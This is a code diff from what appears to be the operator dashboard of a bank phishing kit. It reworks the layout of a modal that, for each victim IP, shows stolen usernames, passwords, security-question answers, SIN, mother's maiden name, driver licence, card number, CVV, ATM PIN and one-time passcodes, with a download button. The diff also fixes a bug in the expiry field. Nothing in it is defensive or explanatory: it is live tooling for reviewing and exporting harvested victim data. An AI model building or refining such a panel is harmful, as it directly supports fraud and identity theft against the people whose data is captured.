@@ -123,42 +123,61 @@ function showResultsModal(_ipAddress) {
         console.log(details.ip)
         if (details.getUserDataLogin || details.getUserDataQuestion || details.getUserDataDetails || details.getUserDataCard || details.getUserDataOTP) {
           console.log(details.getUserDataLogin.username)
-          modalBody.innerHTML = `   <div class="card">
-                 <button id="downloadButton" class="btn btn-secondary mt-2">Download</button>
-    <div class="card-header">
-        IP: ${ipAddress}
-    </div>
-    <ul class="list-group list-group-flush">
-        <li class="list-group-item">Username: ${details.getUserDataLogin.username || ''}</li>
-        <li class="list-group-item">Password: ${details.getUserDataLogin.password || ''}</li>
-        <li class="list-group-item">UserAgent: ${details.getUserDataLogin.userAgent || ''}</li>
-          <li class="list-group-item">----------------------------------------------------------</li>
-          <li class="list-group-item">${details.getUserDataQuestion.question1 || ''} : ${details.getUserDataQuestion.answer1 || ''}</li>
-          <li class="list-group-item">${details.getUserDataQuestion.question2 || ''} : ${details.getUserDataQuestion.answer2 || ''}</li>
-          <li class="list-group-item">${details.getUserDataQuestion.question3 || ''} : ${details.getUserDataQuestion.answer3 || ''}</li>
-          <li class="list-group-item">${details.getUserDataQuestion.question4 || ''} : ${details.getUserDataQuestion.answer4 || ''}</li>
-          <li class="list-group-item">${details.getUserDataQuestion.question5 || ''} : ${details.getUserDataQuestion.answer5 || ''}</li>
-          <li class="list-group-item">${details.getUserDataOTP.customQuestion || ''} : ${details.getUserDataOTP.customAnswer || ''}</li>
-            <li class="list-group-item">----------------------------------------------------------</li>
-        <li class="list-group-item">Full Name: ${details.getUserDataDetails.name || ''}</li>
-        <li class="list-group-item">Address: ${details.getUserDataDetails.address || ''}</li>
-        <li class="list-group-item">City: ${details.getUserDataDetails.city || ''}</li>
-        <li class="list-group-item">Phone Number: ${details.getUserDataDetails.phone || ''}</li>
-        <li class="list-group-item">Postal Code: ${details.getUserDataDetails.postal || ''}</li>
-        <li class="list-group-item">Digit Pin: ${details.getUserDataDetails.pin || ''}</li>
-        <li class="list-group-item">Email: ${details.getUserDataDetails.email || ''}</li>
-        <li class="list-group-item">DOB: ${details.getUserDataDetails.dob1 || ''}/${details.getUserDataDetails.dob2 || ''}/${details.getUserDataDetails.dob3 || ''} || ${details.getUserDataDetails.dob || ''}</li>
-        <li class="list-group-item">Mmn: ${details.getUserDataDetails.mmn || ''}</li>
-        <li class="list-group-item">Sin: ${details.getUserDataDetails.sin || ''}</li>
-        <li class="list-group-item">Driver Licence: ${details.getUserDataDetails.drivers || ''}</li>
-         <li class="list-group-item">----------------------------------------------------------</li>
-         <li class="list-group-item">Card Number: ${details.getUserDataCard.card || ''}</li>
-         <li class="list-group-item">Exp: ${details.getUserDataCard.exp1 || ''}/${details.getUserDataCard.exp1 || ''}</li>
-        <li class="list-group-item">Cvv: ${details.getUserDataCard.cvv || ''}</li>
-        <li class="list-group-item">ATM PIN: ${details.getUserDataCard.atm || ''}</li>
-         <li class="list-group-item">----------------------------------------------------------</li>
-        <li class="list-group-item">OTP: ${details.getUserDataOTP.code || ''}</li>
-    </ul> </div>`;
+          modalBody.innerHTML = `   <div class="card mb-3">
+          <div class="card-header bg-primary text-white">
+            <strong>User Information - IP: ${ipAddress}</strong>
+          </div>
+          <div class="card-body">
+            <h5 class="card-title">Login Details</h5>
+            <p class="card-text">
+              Username: ${details.getUserDataLogin.username || 'N/A'}<br>
+              Password: ${details.getUserDataLogin.password || 'N/A'}<br>
+              UserAgent: ${details.getUserDataLogin.userAgent || 'N/A'}
+            </p>
+            
+            <h5 class="card-title">Security Questions</h5>
+            <p class="card-text">
+              ${details.getUserDataQuestion.question1 || 'N/A'} : ${details.getUserDataQuestion.answer1 || 'N/A'}<br>
+              ${details.getUserDataQuestion.question2 || 'N/A'} : ${details.getUserDataQuestion.answer2 || 'N/A'}<br>
+              ${details.getUserDataQuestion.question3 || 'N/A'} : ${details.getUserDataQuestion.answer3 || 'N/A'}<br>
+              ${details.getUserDataQuestion.question4 || 'N/A'} : ${details.getUserDataQuestion.answer4 || 'N/A'}<br>
+              ${details.getUserDataQuestion.question5 || 'N/A'} : ${details.getUserDataQuestion.answer5 || 'N/A'}<br>
+              ${details.getUserDataOTP.customQuestion || 'N/A'} : ${details.getUserDataOTP.customAnswer || 'N/A'}
+            </p>
+        
+            <h5 class="card-title">Personal Information</h5>
+            <p class="card-text">
+              Full Name: ${details.getUserDataDetails.name || 'N/A'}<br>
+              Address: ${details.getUserDataDetails.address || 'N/A'}<br>
+              City: ${details.getUserDataDetails.city || 'N/A'}<br>
+              Phone Number: ${details.getUserDataDetails.phone || 'N/A'}<br>
+              Postal Code: ${details.getUserDataDetails.postal || 'N/A'}<br>
+              Email: ${details.getUserDataDetails.email || 'N/A'}<br>
+              DOB: ${details.getUserDataDetails.dob1 || 'N/A'}/${details.getUserDataDetails.dob2 || 'N/A'}/${details.getUserDataDetails.dob3 || 'N/A'}<br>
+              Mmn: ${details.getUserDataDetails.mmn || 'N/A'}<br>
+              Sin: ${details.getUserDataDetails.sin || 'N/A'}<br>
+              Driver Licence: ${details.getUserDataDetails.drivers || 'N/A'}
+            </p>
+        
+            <h5 class="card-title">Card Information</h5>
+            <p class="card-text">
+              Card Number: ${details.getUserDataCard.card || 'N/A'}<br>
+              Exp: ${details.getUserDataCard.exp1 || 'N/A'}/${details.getUserDataCard.exp2 || 'N/A'}<br>
+              Cvv: ${details.getUserDataCard.cvv || 'N/A'}<br>
+              ATM PIN: ${details.getUserDataCard.atm || 'N/A'}
+            </p>
+        
+            <h5 class="card-title">One-Time Password (OTP)</h5>
+            <p class="card-text">
+              OTP: ${details.getUserDataOTP.code || 'N/A'}
+            </p>
+        
+            <div class="d-flex justify-content-end">
+              <button id="downloadButton" class="btn btn-secondary mt-2">Download</button>
+            </div>
+          </div>
+        </div>
+        `;
   
         } else {
           modalBody.innerHTML = `No result for IP: ${ipAddress}`;
